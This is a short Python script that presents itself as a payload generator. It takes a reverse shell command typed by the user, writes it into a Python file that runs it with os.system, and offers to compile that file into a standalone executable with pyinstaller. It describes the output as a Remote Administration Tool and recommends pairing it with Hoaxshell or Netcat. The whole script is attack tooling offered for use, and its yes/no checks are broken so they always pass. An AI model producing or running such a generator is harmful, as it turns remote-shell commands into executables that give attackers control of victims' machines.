#!/bin/python3.10
import os
import time

print("This payload generator turns reverse shell one liners into")
print("\nRemote Administration Tools or RATs")
print("\nIt is recommended that you use this tool with Hoaxshell or Netcat")

payload = input("\nEnter reverse shell command: ")

text = f'''\
#!/bin/python3.10
import os
os.system('{payload}')
'''

with open ("payload.py", "w") as thePayload:
    thePayload.write(text)
    os.system('cls' if os.name == 'nt' else 'clear')
    time.sleep(1)
    print("Payload generated!!! ")
    time.sleep(1)
cont = input("Would you like to compile an executable? (y/n) ")
if cont == "y" or "Y":
    os.system("pyinstaller --onefile payload.py")
if cont == "n" or "N":
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Closing in 3... 2... 1...")
time.sleep(3)

exit()
